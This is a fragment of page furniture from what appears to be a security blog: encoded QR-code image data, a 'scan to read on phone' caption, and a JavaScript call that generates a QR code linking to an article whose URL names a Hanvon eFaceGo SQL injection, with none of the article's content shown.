vxYqrWyeqi3f63+ZX/qxnTox2FT3fv1Zr9Inq+le6+e6XX+FpIFemrf3cCSy/y+pTd0vqYr8F+sRnfd3f61yn69Y9QmtEvfaUd+z5zlf9ui5f4bjufkPG03iD5+O7LKd3t6fVLel656v+3de5+7mrT53ePCfu+F3Pnpen91WYd125XvUVj77fEE/pTfAYSKZzFU7Z/XZuTdf1r1C/uPKtdOseobV65KJ7l4v6V/nu06++Qvt1vzx4DGTVZOs/ewKn77IypUTfRrSEU+55ufl4E+qiefkKu++Op4+ejskl1LOvRLQxoiX0met8pevrqF/s+ZHvN8RTehM8fZfltFb7yw1K9Pxd3SqvLva+WSuhvvKZHzF1iV4jT24MdXuMuTyv8t0vF1ObuOPx7DfEU3oTPA0kU0q4P29FR/PxXoV5sXvUO+pTd125eVE9eKVF76Fv1bv75dbJrRfVRf2rvD7zwdNANG18zQmcBpIpJfp2nLZoPt5E59ESXZeL9hNTk+h5uRjPKvR0dA31zu1nXlQXreuoX73zOz3500BssvE1J3AaSKY0htvydojqYtftoS7vfvPq3acu6r/z6Q92rz3EeMbQ3/Pqes2LXe+8+67yp4Fo2viaEzj9pO42VtP0lpiXi9Z31K+uX1S/w+6XX6G9XFtUt0Zd/pmvf/9X17fKd73zVR99wf2G5BTeKI6f1J2+uNrjXb7fAvmz/Vb9ex99V+ha5qzt2PPyXq9ufc93rl/s+RWPvt+QnMIbxfEZ4vSfRb8Gb4Go3tG+Xe9cn2h+1V9fUK8YLSFf9VCPNyG3LlpCXTTfMd7EnR5Pj/2G9FN7MT8G4tTvcLVfJ93zvZ959b+ts160T1Btha4Vb0IuRkvI7RMtod5RnxhvQi5GS3QezTgGomnja0/gNJA+fflqm6v8SrfPXV6f2P3yK7RG9PaJ6qK6vdTFlW5e1NfRvPgofxqIRRtfcwLfNhBvmV+GfHUbzIu9Tm69vKP1I+pRu+uhX+x18p5Xv0PrxO53f8FvG4iLbfy3E/i2gWS6Cae/2tZd/q7OevHKby77SejJc0K+wngSPd/7xpPQl+er6HXdLw9+20DSbMe/n8BpIE6z42qplc+bsqozL9pHbl3Xe15+hdZ2XPXuPrl+15D3fOf6VnjlPw1kVbz1nzmBYyBO/w7vtmW9vn4LzKuL6tZ1ri6at/4K9a6w95CvsPfR13X30nW5daJ68BhIyI7Xn8AeyOtnMO3g/wAAAP//962d7gAAAAZJREFUAwBV/BnRnLtVEAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 